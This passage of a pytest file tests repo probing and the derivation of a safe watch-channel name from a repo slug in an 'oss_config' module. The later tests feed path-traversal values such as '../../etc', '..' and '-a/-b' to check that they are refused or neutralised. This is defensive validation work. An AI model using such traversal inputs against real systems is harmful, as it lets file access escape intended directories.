    monkeypatch.setattr(oss_config, "_gh_json", _fake_gh)
    probe, _, _ = oss_config.gather(tmp_path)
    assert oss_config.classify_labels(probe["labels"])["unclassified"] == ["bug"]


def test_gathering_a_directory_that_is_not_a_repo_is_a_refusal(tmp_path):
    """A directory git cannot read must not come back as a repo with no files."""
    probe, problems, _ = oss_config.gather(tmp_path / "nowhere")
    assert probe is None
    assert problems


@needs_git
def test_gathering_refuses_when_the_remote_half_cannot_be_measured(tmp_path, monkeypatch):
    """Half a probe is the underspecified probe this whole contract exists to stop."""
    _git_repo(tmp_path, {"README.md": "# thing\n"})
    monkeypatch.setattr(
        oss_config, "_gh_json", lambda root, args: (False, None, "gh: not authenticated")
    )
    probe, problems, _ = oss_config.gather(tmp_path)
    assert probe is None
    assert any("gh" in problem for problem in problems)


@needs_git
def test_a_merge_method_that_cannot_be_told_apart_stays_null(tmp_path, monkeypatch):
    _git_repo(tmp_path, {"README.md": "# thing\n"})

    def both_allowed(root, args):
        ok, payload, detail = _fake_gh(root, args)
        if args[0] == "repo":
            payload["mergeCommitAllowed"] = True
        return ok, payload, detail

    monkeypatch.setattr(oss_config, "_gh_json", both_allowed)
    probe, problems, _ = oss_config.gather(tmp_path)
    assert problems == []
    assert probe["merge_method"] is None


# ----------------------------------------------- the watch channel name (#207)
#
# `bin/oss-workspace` derived `SUPERTOOL_WATCH_NAME` from `repo` with a bare
# `re.sub`, which permitted `.`, `..` and a leading `-` -- the one consumer of
# `repo` in this plugin that did not route through `repo_problem`. The derivation
# lives here now so the launcher has one call to make and the rule has one home.


@pytest.mark.parametrize("value", ["..", ".", "../../etc"])
def test_the_watch_name_refuses_exactly_what_repo_problem_refuses(value):
    """The three values #207 tabulates, and the SAME sentence for each.

    Equality against `repo_problem` rather than a substring match: a second
    wording invented here would drift from the one `scaffold` and `doctor` print,
    and one fact with two sentences is how a guard stops being recognisable as
    the guard it duplicates.
    """
    name, problem = oss_config.watch_channel_name(value)
    assert name is None
    assert problem == oss_config.repo_problem(value)


def test_a_valid_slug_still_derives_a_name():
    """The must-fire half. Every refusal test above is satisfied by a function
    that returns `(None, "...")` unconditionally.
    """
    assert oss_config.watch_channel_name("owner/name") == ("owner-name", None)


def test_sanitising_still_happens_after_the_validator():
    """`repo_problem` accepts any pair of non-slash, non-whitespace runs, so the
    validator is not a replacement for the fold -- `+` passes it and a socket path
    should not carry one.
    """
    assert oss_config.watch_channel_name("Org.Name/re+po")[0] == "Org.Name-re-po"


def test_a_null_repo_is_refused_here_though_repo_problem_defers_it():
    """The two disagree on exactly one value, deliberately.

    `repo_problem(None)` returns None because `validate()` owns the sentence about
    a required key being null, and repeating it would put two sentences on one
    fact. There is no `validate()` in the launcher's path, so a null arriving here
    unrefused would derive `None` and export it -- the same asymmetry one layer in.
    """
    assert oss_config.repo_problem(None) is None
    name, problem = oss_config.watch_channel_name(None)
    assert name is None
    assert "None" in problem


@pytest.mark.parametrize("value", ["owner/name", "../..", "./..", "-a/-b",
                                   "Org.Name/re+po"])
def test_no_accepted_slug_derives_a_name_that_is_a_traversal(value):
    """The property the refusal buys, stated rather than left to the three values.

    `repo_problem` accepts `../..` -- two runs of non-slash, non-whitespace -- so
    the fix is not "no dots survive". What it guarantees is narrower and is the
    part that matters: the one slash a valid slug carries always becomes a dash,
    so the result holds no separator and can never be `.` or `..` exactly. That is
    what makes the question #207 left open -- component or infix -- moot, which is
    the issue's own argument for routing through the validator.
    """
    assert oss_config.repo_problem(value) is None, "fixture is not an accepted slug"
    name, problem = oss_config.watch_channel_name(value)
    assert problem is None
    assert "/" in value and "/" not in name
    assert name not in (".", "..")
